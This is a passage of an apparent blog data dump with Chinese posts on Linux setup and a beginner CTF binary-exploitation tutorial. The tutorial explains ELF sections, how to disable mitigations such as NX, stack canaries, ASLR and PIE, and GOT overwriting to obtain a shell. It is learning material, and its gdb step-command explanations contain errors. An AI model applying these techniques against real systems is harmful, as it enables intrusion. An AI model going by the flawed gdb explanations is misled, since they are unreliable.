class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep <span class=\"string\">&quot;pattern&quot;</span> filename <span class=\"comment\"># 在文件中查找 pattern 字符串</span></span><br><span class=\"line\">grep -r <span class=\"string\">&quot;pattern&quot;</span> directory <span class=\"comment\"># 在目录中递归查找 pattern 字符串</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"du\"><a href=\"#du\" class=\"headerlink\" title=\"du\"></a>du</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">du</span> -h --max-depth=1 | <span class=\"built_in\">sort</span> -h   <span class=\"comment\"># 查看当前目录下各文件夹大小</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.lxlinux.net/1431.html\">https://www.lxlinux.net/1431.html</a><br>菜鸟教程<br><a href=\"https://blog.csdn.net/KevinChen2019/article/details/119697489\">https://blog.csdn.net/KevinChen2019/article/details/119697489</a><br><a href=\"https://blog.csdn.net/lucky__peng/article/details/124268817\">https://blog.csdn.net/lucky__peng/article/details/124268817</a><br><a href=\"https://blog.csdn.net/liuxiao723846/article/details/125042549\">https://blog.csdn.net/liuxiao723846/article/details/125042549</a></p>\n","excerpt":"<p>最近用到 Linux 挺多，整理一下。</p>","more":"<h2 id=\"终端美化\"><a href=\"#终端美化\" class=\"headerlink\" title=\"终端美化\"></a>终端美化</h2><p>一个好看的终端确实是第一生产力</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 oh-my-posh</span></span><br><span class=\"line\">sudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> +x /usr/local/bin/oh-my-posh</span><br><span class=\"line\"><span class=\"comment\"># 下载主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.poshthemes</span><br><span class=\"line\">wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip</span><br><span class=\"line\">unzip ~/.poshthemes/themes.zip -d ~/.poshthemes</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> u+rw ~/.poshthemes/*.omp.*</span><br><span class=\"line\"><span class=\"built_in\">rm</span> ~/.poshthemes/themes.zip</span><br></pre></td></tr></table></figure>\n\n<p><code>oh-my-posh get shell</code> 看看 shell，一般是 bash 的情况下，就在 <code>~/.bashrc</code>（也可能是 <code>~/.profile</code> 或 <code>~/.bash_profile</code>）文件追加一行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span> <span class=\"string\">&quot;<span class=\"subst\">$(oh-my-posh init bash --config ~/.poshthemes/.kali.omp.json)</span>)&quot;</span> <span class=\"comment\"># kali为主题名称，可以自己更换其他的</span></span><br></pre></td></tr></table></figure>\n\n<p>说起来这个 kali 主题还是 GZTime 学长提的 pr ，当时他还打成了 kail 来着（笑<br>然后执行以下命令重载配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> bash</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>oh-my-posh 官方文档：<a href=\"https://ohmyposh.dev/docs/\">https://ohmyposh.dev/docs/</a></p>\n</blockquote>\n<h2 id=\"换源\"><a href=\"#换源\" class=\"headerlink\" title=\"换源\"></a>换源</h2><p>CentOS 默认已经调好阿里源了，就不用换了，以下是 apt 换中大源的方法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<p>按 <code>i</code> 切换到编辑模式，然后全删了，写入 <code>deb https://mirrors.matrix.moe/kali kali-rolling main non-free contrib</code>，<code>Esc</code> 键退出编辑模式，<code>:wq</code> 保存退出。</p>\n<p>更新软件源列表：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ssh配置\"><a href=\"#ssh配置\" class=\"headerlink\" title=\"ssh配置\"></a>ssh配置</h2><p>想起我闲置的阿里服务器，又折腾了好久。<br>首先新建用户： <code>adduser &lt;用户名&gt;</code> 并设置好密码（网上说 CentOS 下的 adduser 和 useradd 是一样的，但我用的时候他也给我一整套配下来了，<code>home</code> 下也有文件夹。）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su &lt;用户名&gt;</span><br><span class=\"line\">ssh-keygen -t rsa   <span class=\"comment\">#生成密钥对，一路回车就行</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\"><span class=\"built_in\">cat</span> id_rsa.pub &gt;&gt; authorized_keys   <span class=\"comment\">#把密钥添加到authorized_keys文件中</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 600 authorized_keys</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 700 ~/.ssh    <span class=\"comment\">#权限700的时候，sshd才能读到</span></span><br><span class=\"line\">service sshd restart    <span class=\"comment\">#重启sshd服务</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"权限说明\"><a href=\"#权限说明\" class=\"headerlink\" title=\"权限说明\"></a>权限说明</h2><p>一般用三个数字表明文件的权限，第一个数字表示用户，第二个数字表示组，第三个数字表示公共。</p>\n<p>4 表示可读， 2 表示可写， 1 表示可执行，加一起就是全部权限。<br>比如 755 表示用户可读，可写，可执行，组可读，可执行，公共可读，可执行。</p>\n<p>可能你会问 222 权限啥意思，难道还能只写不读？<br>其实还真是这样，笔者试过可以 <code>cat &gt;&gt; file</code> 进行追加写入，但不能读取文件内容。</p>\n<p>遇到文件执行不了的情况，试试 <code>chmod +x [file]</code> ，就有执行权限了。</p>\n<h2 id=\"编辑器（vim）\"><a href=\"#编辑器（vim）\" class=\"headerlink\" title=\"编辑器（vim）\"></a>编辑器（vim）</h2><p>虽然有 VSCode 的存在，但有时候由于 ssh 的用户权限不够等原因不可避免地要用到 vim （当然硬要避免也有在其他地方写好再 cp 过去等诡方法，但总是麻烦着点）<br>vim 的三个模式：<strong>命令</strong>模式（ Command mode ），<strong>输入</strong>模式（ Insert mode ）和<strong>底线命令</strong>模式（ Last line mode ）<br>一般就按 <code>i</code> 进入编辑模式， <code>Esc</code> 退出编辑模式并 <code>:wq</code> 保存退出。<br>在查看模式下，可以 <code>h</code> 左移， <code>j</code> 下移， <code>k</code> 上移， <code>l</code> 右移，按 <code>/</code> 可以搜索。</p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><blockquote>\n<p>命令行 without 鼠标确实爽。</p>\n</blockquote>\n<h3 id=\"chown\"><a href=\"#chown\" class=\"headerlink\" title=\"chown\"></a>chown</h3><p>即 change owner ，用于改变文件的所有者。</p>\n<p>一般 <code>chown [user] [file]</code> ，如果是目录还要加上 <code>-R</code> 参数，意为改变目录下所有文件的所有者。</p>\n<h3 id=\"ln\"><a href=\"#ln\" class=\"headerlink\" title=\"ln\"></a>ln</h3><p>即 link ，用于创建符号链接，和 Windows 的快捷方式类似。</p>\n<p>一般 <code>ln -s [old] [new]</code> ，就是创建一个符号链接，把 old 文件的内容链接到 new 文件，如果后面不加 <code>[new]</code> 参数，那么就会默认创建到当前目录下。</p>\n<h3 id=\"ps\"><a href=\"#ps\" class=\"headerlink\" title=\"ps\"></a>ps</h3><p>即 process status ，用于查看进程状态。</p>\n<p>一般加 -aux 显示所有包含其他使用者的进程。<br>不过这只是一个快照，如果想看动态的，就用 <a href=\"#top\">top</a> 命令。</p>\n<h3 id=\"top\"><a href=\"#top\" class=\"headerlink\" title=\"top\"></a>top</h3><p>没啥缩写了，就是 top ，用于实时显示进程的状态。</p>\n<h3 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"grep\"></a>grep</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep <span class=\"string\">&quot;pattern&quot;</span> filename <span class=\"comment\"># 在文件中查找 pattern 字符串</span></span><br><span class=\"line\">grep -r <span class=\"string\">&quot;pattern&quot;</span> directory <span class=\"comment\"># 在目录中递归查找 pattern 字符串</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"du\"><a href=\"#du\" class=\"headerlink\" title=\"du\"></a>du</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">du</span> -h --max-depth=1 | <span class=\"built_in\">sort</span> -h   <span class=\"comment\"># 查看当前目录下各文件夹大小</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.lxlinux.net/1431.html\">https://www.lxlinux.net/1431.html</a><br>菜鸟教程<br><a href=\"https://blog.csdn.net/KevinChen2019/article/details/119697489\">https://blog.csdn.net/KevinChen2019/article/details/119697489</a><br><a href=\"https://blog.csdn.net/lucky__peng/article/details/124268817\">https://blog.csdn.net/lucky__peng/article/details/124268817</a><br><a href=\"https://blog.csdn.net/liuxiao723846/article/details/125042549\">https://blog.csdn.net/liuxiao723846/article/details/125042549</a></p>"},{"title":"pwn 入门","date":"2022-07-18T10:14:00.000Z","_content":"\n浅记一下这些天学 pwn 的历程\n<!--more-->\n********************************\n\n## 前言\n\n本文默认读者具有一定的汇编基础。\n\n## ELF文件的结构\n\n**ELF**（Executable and Linkable Format）即 Linux 下的可执行文件格式，和 Windows 下的 **PE** 格式类似，但 Linux 中的可执行文件一般不会加后缀名。\nELF 文件中有多个节（ Section ），主要有：\n\n* **.text** 节：即代码段，用来放代码\n* **.rodata** 节：ro 即 read only ，**只读**数据段，用来放静态数据，如果尝试修改会报错\n    > `.rdata` 和 `.rodata` 的区别：两者都是只读数据段，但 `.rdata` 是 Windows 的常用说法，而 Linux 中则一般称 `.rodata`\n* **.data** 节：数据段，存放**可修改**的数据\n* **.bss** 节：中文不知道叫什么名字的段，也是放**可修改**的数据，但是**没有初始化**，所以不占ELF文件的空间，程序运行时会自动分配内存\n* **.plt** 节和 **.got** 节：外部调用段（也不知道叫什么名字，这个是 AI 给我打的），调用动态链接库的函数的时候会用到\n\n## Linux下的漏洞缓解措施\n\n有攻就有防，为了不被攻击者随便打烂，一些防范措施是必不可少的。\n在终端里可以执行 `checksec --file=文件名` 来查看 ELF 文件的保护机制。\n\n1. **NX** ( No eXecute )(没错 X 就是大写，没打错)\n    基本规则为**可写权限**与**可执行权限**互斥，即可被修改写入 shellcode 的内存都不可执行，被执行的代码数据不可修改，至于 shellcode 是啥，后面再提。\n    gcc 默认开启，编译加 `-z execstack` 参数可以关闭\n2. **Stack Canary**\n    Canary 意为金丝雀，以前矿工进入矿井时都会随身带一只金丝雀，通过观察金丝雀的状态来判断氧气浓度等情况。这个保护专门针对栈溢出攻击。\n    gcc 同样默认开启，编译加 `fno-stack-protector` 参数关闭\n3. **ASLR** ( Address Space Layout Randomization )\n    将程序的堆栈地址和动态链接库的加载地址进行一定的随机化\n    ASLR 是系统级的保护机制，关闭要修改 /proc/sys/kernel/randomize_va_space 文件，写入 0 即可\n4. **PIE** ( Position Independent Executable )\n    和 ASLR 类似，让 ELF 的地址随机化加载\n    高版本 gcc 默认开启，编译加 `-no-pie` 参数可以关闭，旧版本则需加 `-fpic-pie` 参数开启\n5. **Full RELRO** ( Read-Only Relocation )\n    禁止写入 `.got.plt` 表\n    gcc 编译加 `-z relro` 参数开启。\n\n## GOT和PLT\n\n`.plt` 表是一段代码，可从内存中读取一个地址然后进行跳转，而 `.got.plt` 表则存放函数的实际地址。\n实际上，`.got.plt` 表是一个函数指针数组，存放 ELF 所有用到的外部函数在内存中的地址，由操作系统初始化。\n题目中如果没开 `Full RELRO` 保护，那么就有可能通过修改 `.got.plt` 表中的函数地址来偷梁换柱，比如把表中 `puts` 的地址换成 `system` 的地址就能使 `puts(\"\\bin\\sh\")` 变成 `system(\"/bin/sh\")`，从而拿到 shell 。\n\n## 常用工具\n\n1. **IDA**\n\n    拿到程序第一件事——用 IDA 看看伪代码\n    分 32 位和 64 位两个版本，**这个打开不行就换另一个**，虽然我也不知道为啥不加个自动识别（）\n    把程序拖进去，弹出一个奇怪的选项框，初学者直接 `enter`或者点 `OK` 就完事，然后进到 `IDA View-A` 标签页，这里初始时一般是流程图的形式，在此标签页按空格可以切换到普通模式，**记住不是在 `Pseudocode-A` 按**\n    这时候按 `F5` 生成伪代码，看到顶上的标签页切到了 `Pseudocode-A` ， Pseudocode 是伪码的意思，至于这个 A ，你如果再按一次 `F5` 就能新建一个 `Pseudocode-B` 了（）\n    然后就可以这点点那点点发现新世界了，嘿嘿\n    如下是一些常用的快捷键：\n    * 按 `Esc` 可以返回刚才的页面\n    * 按 `Tab` 可以在 `IDA View-A` 和 `Pseudocode-A` 等标签页之间切换\n    * 双击函数或者变量可以跳转到它所在的地方\n    * 点一下变量再按 `N` 可以对变量重命名，有时方便分析\n    * `Shift+F12` 查找字符串\n2. **pwntools**\n\n    python 的一个库，可以用与远程服务器或者本地程序交互，但不保证在 Windows 下能正常使用（反正我 Windows 跑 pwntools 是有问题的\n    常用操作：\n    * `r = process(\"./pwn\")` 本地运行程序（其实本地一般用 `p` 作变量表示process或者`io`兼顾本地和远程，看个人习惯了\n    * `r = remote(ip, port)` 连接服务器\n    * `r.sendline(data)` 发送数据，末尾补 `\\x0a`（换行符）\n    * `r.send(data)` 发送数据，末尾不补 `\\x0a`\n    * `r.recvline()` 接收一行数据\n    * `r.recvuntil(str)` 接收直到遇到 `str` 为止\n    * `r.recv(n)`接收 `n` 个字节\n    * `r.interactive()` 开始人工手动交互\n\n    pwntools 在 python3 中使用的话，交互的数据都是 `bytes` 类型，而不是 `str` 类型，意思就是 `send` 里的东西要是字节串， `recv` 出来的也是字节串，字符串转字节方法一般是 `str.encode()` ，或者 `send(b'hello')`\n3. **pwndbg**\n\n    pwn 里面少不了本地调试，正常人都不能肉眼分析，那么就要用到 gdb ，but 裸的 gdb 太朴素了，不能满足人们日益增长的对优雅的追求，所以就有了**颜值极高**的 gdb 插件—— pwndbg\n    安装方式：\n\n    ```bash\n    git clone https://github.com/pwndbg/pwndbg\n    cd pwndbg\n    ./setup.sh\n    ```\n\n    然后康康 `~/.gdbinit` 里有没有 `source ~/pwndbg/gdbinit.py` ，如果没有就加上，然后 `source ~/.gdbinit` ，然后就可以愉快地玩耍了\n    在 VSCode 里起 gdb 要用 tmux ，直接 `sudo apt-get install tmux` 安装\n    > **tmux的简单使用**：\n    `tmux` 进入窗口\n    `tmux ls` 查看会话列表\n    `Ctrl+B` `左右键` 切换会话窗口，一般默认左右分布，也可调成上下\n    `Ctrl+B` `D` 退出当前会话但不关闭，可以 `tmux attach -t <会话名>` 再次进入\n\n    脚本里可以使用如下语句起 gdb：\n\n    ```python\n    p = process('./pwn')\n    context.terminal = ['tmux','splitw','-h']\n    gdb.attach(p,gdbscript=\"b main\")\n    ```\n\n    pwndbg 界面由上至下依次为\n    * **legend**：图例，一般指示黄色为 Stack（栈），蓝色为 Heap（堆），红色为 Code（代码），紫色为 Data（数据），白色下划线为RWX（不知道啥），白色为 Rodata（只读数据）\n    * **registers**：显示 CPU 的寄存器值\n    * **disasm**：显示当前地址的反汇编代码\n    * **stack**：显示栈的内容\n    * **backtrace**：显示调用堆栈（我也不知道具体干嘛的）\n\n    常用操作：\n    * `x/4xg 0x400000` 查看内存中地址 `0x400000` 开始的 4*16 个字节，以 8 个字节每组的 16 进制形式显示，一般在分析 64 位程序时使用，因为 64 位程序的地址是 8 个字节， 32 位时，命令可以换成 `x/4x` ，每组 4 个字节，适用 32 位程序的地址\n    * `ni` 也就是 next into ，执行下一条指令，如果是函数调用，就进入函数\n    * `si` 也就是 step into ，执行下一条指令，如果是函数调用，就进入函数，但是不会执行函数内的第一条指令，而是停在函数内的第一条指令上\n    * `c` continue ，继续执行，直到遇到断点或者程序结束\n    * `q` quit ，退出 gdb\n    * `vmmap` 查看内存映射，可以看到程序的基地址，栈地址，堆地址等，后面加个 `libc` 可以单看 libc 的基地址（白色的那行\n    * `set` 改变变量的值，比如 `set $eax=0` 就把 eax 的值改成了 0\n    * `b` 设置断点，后面加地址或者函数名，比如 `b *0x400000` 或者 `b main` ，后者是在 main 函数入口处设置断点，或者 `b *main+111` 在 main 函数的第 111 条指令处设置断点\n\n## 常见攻击方式\n\n### 整数溢出\n\n这个比较简单，大概就是通过溢出绕过一些大小判断，不再赘述。\n\n### 栈溢出\n\n先说几个概念\n执行 call 指令时， CPU 会先把 call 指令的下一条指令地址压栈再跳转，返回时 ret 指令会从栈中把存放的地址弹出到 EIP 。\ngets 不检查读入的字符串长度，所以可能会出现栈溢出。\n当栈作为缓冲区时，如果输入的数据长度超过缓冲区的长度，就会发生栈溢出，从而覆盖返回地址，从而控制程序流程。\n\n未完待续...\n\n## 参考\n\n* 《从0到1：CTFer成长之路》——Nu1L战队[著]\n* 《CTF竞赛权威指南.Pwn篇》——杨超[著]\n* <https://blog.csdn.net/sui_152/article/details/121650341>\n* <https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata>\n* <https://blog.csdn.net/weixin_52553215/article/details/120690453>\n* <https://blog.csdn.net/zino00/article/details/122716412>\n* <https://blog.csdn.net/Demondai999/article/details/123875264>\n","source":"_posts/pwn 入门.md","raw":"---\ntitle: pwn 入门\ndate: 2022-07-18 18:14:00\ntags: [CTF, 二进制安全, pwn]\ncategories: 学习\n---\n\n浅记一下这些天学 pwn 的历程\n<!--more-->\n********************************\n\n## 前言\n\n本文默认读者具有一定的汇编基础。\n\n## ELF文件的结构\n\n**ELF**（Executable and Linkable Format）即 Linux 下的可执行文件格式，和 Windows 下的 **PE** 格式类似，但 Linux 中的可执行文件一般不会加后缀名。\nELF 文件中有多个节（ Section ），主要有：\n\n* **.text** 节：即代码段，用来放代码\n* **.rodata** 节：ro 即 read only ，**只读**数据段，用来放静态数据，如果尝试修改会报错\n    > `.rdata` 和 `.rodata` 的区别：两者都是只读数据段，但 `.rdata` 是 Windows 的常用说法，而 Linux 中则一般称 `.rodata`\n* **.data** 节：数据段，存放**可修改**的数据\n* **.bss** 节：中文不知道叫什么名字的段，也是放**可修改**的数据，但是**没有初始化**，所以不占ELF文件的空间，程序运行时会自动分配内存\n* **.plt** 节和 **.got** 节：外部调用段（也不知道叫什么名字，这个是 AI 给我打的），调用动态链接库的函数的时候会用到\n\n## Linux下的漏洞缓解措施\n\n有攻就有防，为了不被攻击者随便打烂，一些防范措施是必不可少的。\n在终端里可以执行 `checksec --file=文件名` 来查看 ELF 文件的保护机制。\n\n1. **NX** ( No eXecute )(没错 X 就是大写，没打错)\n    基本规则为**可写权限**与**可执行权限**互斥，即可被修改写入 shellcode 的内存都不可执行，被执行的代码数据不可修改，至于 shellcode 是啥，后面再提。\n    gcc 默认开启，编译加 `-z execstack` 参数可以关闭\n2. **Stack Canary**\n    Canary 意为金丝雀，以前矿工进入矿井时都会随身带一只金丝雀，通过观察金丝雀的状态来判断氧气浓度等情况。这个保护专门针对栈溢出攻击。\n    gcc 同样默认开启，编译加 `fno-stack-protector` 参数关闭\n3. **ASLR** ( Address Space Layout Randomization )\n    将程序的堆栈地址和动态链接库的加载地址进行一定的随机化\n    ASLR 是系统级的保护机制，关闭要修改 /proc/sys/kernel/randomize_va_space 文件，写入 0 即可\n4. **PIE** ( Position Independent Executable )\n    和 ASLR 类似，让 ELF 的地址随机化加载\n    高版本 gcc 默认开启，编译加 `-no-pie` 参数可以关闭，旧版本则需加 `-fpic-pie` 参数开启\n5. **Full RELRO** ( Read-Only Relocation )\n    禁止写入 `.got.plt` 表\n    gcc 编译加 `-z relro` 参数开启。\n\n## GOT和PLT\n\n`.plt` 表是一段代码，可从内存中读取一个地址然后进行跳转，而 `.got.plt` 表则存放函数的实际地址。\n实际上，`.got.plt` 表是一个函数指针数组，存放 ELF 所有用到的外部函数在内存中的地址，由操作系统初始化。\n题目中如果没开 `Full RELRO` 保护，那么就有可能通过修改 `.got.plt` 表中的函数地址来偷梁换柱，比如把表中 `puts` 的地址换成 `system` 的地址就能使 `puts(\"\\bin\\sh\")` 变成 `system(\"/bin/sh\")`，从而拿到 shell 。\n\n## 常用工具\n\n1. **IDA**\n\n    拿到程序第一件事——用 IDA 看看伪代码\n    分 32 位和 64 位两个版本，**这个打开不行就换另一个**，虽然我也不知道为啥不加个自动识别（）\n    把程序拖进去，弹出一个奇怪的选项框，初学者直接 `enter`或者点 `OK` 就完事，然后进到 `IDA View-A` 标签页，这里初始时一般是流程图的形式，在此标签页按空格可以切换到普通模式，**记住不是在 `Pseudocode-A` 按**\n    这时候按 `F5` 生成伪代码，看到顶上的标签页切到了 `Pseudocode-A` ， Pseudocode 是伪码的意思，至于这个 A ，你如果再按一次 `F5` 就能新建一个 `Pseudocode-B` 了（）\n    然后就可以这点点那点点发现新世界了，嘿嘿\n    如下是一些常用的快捷键：\n    * 按 `Esc` 可以返回刚才的页面\n    * 按 `Tab` 可以在 `IDA View-A` 和 `Pseudocode-A` 等标签页之间切换\n    * 双击函数或者变量可以跳转到它所在的地方\n    * 点一下变量再按 `N` 可以对变量重命名，有时方便分析\n    * `Shift+F12` 查找字符串\n2. **pwntools**\n\n    python 的一个库，可以用与远程服务器或者本地程序交互，但不保证在 Windows 下能正常使用（反正我 Windows 跑 pwntools 是有问题的\n    常用操作：\n    * `r = process(\"./pwn\")` 本地运行程序（其实本地一般用 `p` 作变量表示process或者`io`兼顾本地和远程，看个人习惯了\n    * `r = remote(ip, port)` 连接服务器\n    * `r.sendline(data)` 发送数据，末尾补 `\\x0a`（换行符）\n    * `r.send(data)` 发送数据，末尾不补 `\\x0a`\n    * `r.recvline()` 接收一行数据\n    * `r.recvuntil(str)` 接收直到遇到 `str` 为止\n    * `r.recv(n)`接收 `n` 个字节\n    * `r.interactive()` 开始人工手动交互\n\n    pwntools 在 python3 中使用的话，交互的数据都是 `bytes` 类型，而不是 `str` 类型，意思就是 `send` 里的东西要是字节串， `recv` 出来的也是字节串，字符串转字节方法一般是 `str.encode()` ，或者 `send(b'hello')`\n3. **pwndbg**\n\n    pwn 里面少不了本地调试，正常人都不能肉眼分析，那么就要用到 gdb ，but 裸的 gdb 太朴素了，不能满足人们日益增长的对优雅的追求，所以就有了**颜值极高**的 gdb 插件—— pwndbg\n    安装方式：\n\n    ```bash\n    git clone https://github.com/pwndbg/pwndbg\n    cd pwndbg\n    ./setup.sh\n    ```\n\n    然后康康 `~/.gdbinit` 里有没有 `source ~/pwndbg/gdbinit.py` ，如果没有就加上，然后 `source ~/.gdbinit` ，然后就可以愉快地玩耍了\n    在 VSCode 里起 gdb 要用 tmux ，直接 `sudo apt-get install tmux` 安装\n    > **tmux的简单使用**：\n    `tmux` 进入窗口\n    `tmux ls` 查看会话列表\n    `Ctrl+B` `左右键` 切换会话窗口，一般默认左右分布，也可调成上下\n    `Ctrl+B` `D` 退出当前会话但不关闭，可以 `tmux attach -t <会话名>` 再次进入\n\n    脚本里可以使用如下语句起 gdb：\n\n    ```python\n    p = process('./pwn')\n    context.terminal = ['tmux','splitw','-h']\n    gdb.attach(p,gdbscript=\"b main\")\n    ```\n\n    pwndbg 界面由上至下依次为\n    * **legend**：图例，一般指示黄色为 Stack（栈），蓝色为 Heap（堆），红色为 Code（代码），紫色为 Data（数据），白色下划线为RWX（不知道啥），白色为 Rodata（只读数据）\n    * **registers**：显示 CPU 的寄存器值\n    * **disasm**：显示当前地址的反汇编代码\n    * **stack**：显示栈的内容\n    * **backtrace**：显示调用堆栈（我也不知道具体干嘛的）\n\n    常用操作：\n    * `x/4xg 0x400000` 查看内存中地址 `0x400000` 开始的 4*16 个字节，以 8 个字节每组的 16 进制形式显示，一般在分析 64 位程序时使用，因为 64 位程序的地址是 8 个字节， 32 位时，命令可以换成 `x/4x` ，每组 4 个字节，适用 32 位程序的地址\n    * `ni` 也就是 next into ，执行下一条指令，如果是函数调用，就进入函数\n    * `si` 也就是 step into ，执行下一条指令，如果是函数调用，就进入函数，但是不会执行函数内的第一条指令，而是停在函数内的第一条指令上\n    * `c` continue ，继续执行，直到遇到断点或者程序结束\n    * `q` quit ，退出 gdb\n    * `vmmap` 查看内存映射，可以看到程序的基地址，栈地址，堆地址等，后面加个 `libc` 可以单看 libc 的基地址（白色的那行\n    * `set` 改变变量的值，比如 `set $eax=0` 就把 eax 的值改成了 0\n    * `b` 设置断点，后面加地址或者函数名，比如 `b *0x400000` 或者 `b main` ，后者是在 main 函数入口处设置断点，或者 `b *main+111` 在 main 函数的第 111 条指令处设置断点\n\n## 常见攻击方式\n\n### 整数溢出\n\n这个比较简单，大概就是通过溢出绕过一些大小判断，不再赘述。\n\n### 栈溢出\n\n先说几个概念\n执行 call 指令时， CPU 会先把 call 指令的下一条指令地址压栈再跳转，返回时 ret 指令会从栈中把存放的地址弹出到 EIP 。\ngets 不检查读入的字符串长度，所以可能会出现栈溢出。\n当栈作为缓冲区时，如果输入的数据长度超过缓冲区的长度，就会发生栈溢出，从而覆盖返回地址，从而控制程序流程。\n\n未完待续...\n\n## 参考\n\n* 《从0到1：CTFer成长之路》——Nu1L战队[著]\n* 《CTF竞赛权威指南.Pwn篇》——杨超[著]\n* <https://blog.csdn.net/sui_152/article/details/121650341>\n* <https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata>\n* <https://blog.csdn.net/weixin_52553215/article/details/120690453>\n* <https://blog.csdn.net/zino00/article/details/122716412>\n* <https://blog.csdn.net/Demondai999/article/details/123875264>\n","slug":"pwn 入门","published":1,"updated":"2023-09-29T05:47:55.373Z","_id":"cla7okcsy0001fs6g1nytaq41","comments":1,"layout":"post","photos":[],"content":"<p>浅记一下这些天学 pwn 的历程</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文默认读者具有一定的汇编基础。</p>\n<h2 id=\"ELF文件的结构\"><a href=\"#ELF文件的结构\" class=\"headerlink\" title=\"ELF文件的结构\"></a>ELF文件的结构</h2><p><strong>ELF</strong>（Executable and Linkable Format）即 Linux 下的可执行文件格式，和 Windows 下的 <strong>PE</strong> 格式类似，但 Linux 中的可执行文件一般不会加后缀名。<br>ELF 文件中有多个节（ Section ），主要有：</p>\n<ul>\n<li><strong>.text</strong> 节：即代码段，用来放代码</li>\n<li><strong>.rodata</strong> 节：ro 即 read only ，<strong>只读</strong>数据段，用来放静态数据，如果尝试修改会报错<blockquote>\n<p><code>.rdata</code> 和 <code>.rodata</code> 的区别：两者都是只读数据段，但 <code>.rdata</code> 是 Windows 的常用说法，而 Linux 中则一般称 <code>.rodata</code></p>\n</blockquote>\n</li>\n<li><strong>.data</strong> 节：数据段，存放<strong>可修改</strong>的数据</li>\n<li><strong>.bss</strong> 节：中文不知道叫什么名字的段，也是放<strong>可修改</strong>的数据，但是<strong>没有初始化</strong>，所以不占ELF文件的空间，程序运行时会自动分配内存</li>\n<li><strong>.plt</strong> 节和 <strong>.got</strong> 节：外部调用段（也不知道叫什么名字，这个是 AI 给我打的），调用动态链接库的函数的时候会用到</li>\n</ul>\n<h2 id=\"Linux下的漏洞缓解措施\"><a href=\"#Linux下的漏洞缓解措施\" class=\"headerlink\" title=\"Linux下的漏洞缓解措施\"></a>Linux下的漏洞缓解措施</h2><p>有攻就有防，为了不被攻击者随便打烂，一些防范措施是必不可少的。<br>在终端里可以执行 <code>checksec --file=文件名</code> 来查看 ELF 文件的保护机制。</p>\n<ol>\n<li><strong>NX</strong> ( No eXecute )(没错 X 就是大写，没打错)<br> 基本规则为<strong>可写权限</strong>与<strong>可执行权限</strong>互斥，即可被修改写入 shellcode 的内存都不可执行，被执行的代码数据不可修改，至于 shellcode 是啥，后面再提。<br> gcc 默认开启，编译加 <code>-z execstack</code> 参数可以关闭</li>\n<li><strong>Stack Canary</strong><br> Canary 意为金丝雀，以前矿工进入矿井时都会随身带一只金丝雀，通过观察金丝雀的状态来判断氧气浓度等情况。这个保护专门针对栈溢出攻击。<br> gcc 同样默认开启，编译加 <code>fno-stack-protector</code> 参数关闭</li>\n<li><strong>ASLR</strong> ( Address Space Layout Randomization )<br> 将程序的堆栈地址和动态链接库的加载地址进行一定的随机化<br> ASLR 是系统级的保护机制，关闭要修改 /proc/sys/kernel/randomize_va_space 文件，写入 0 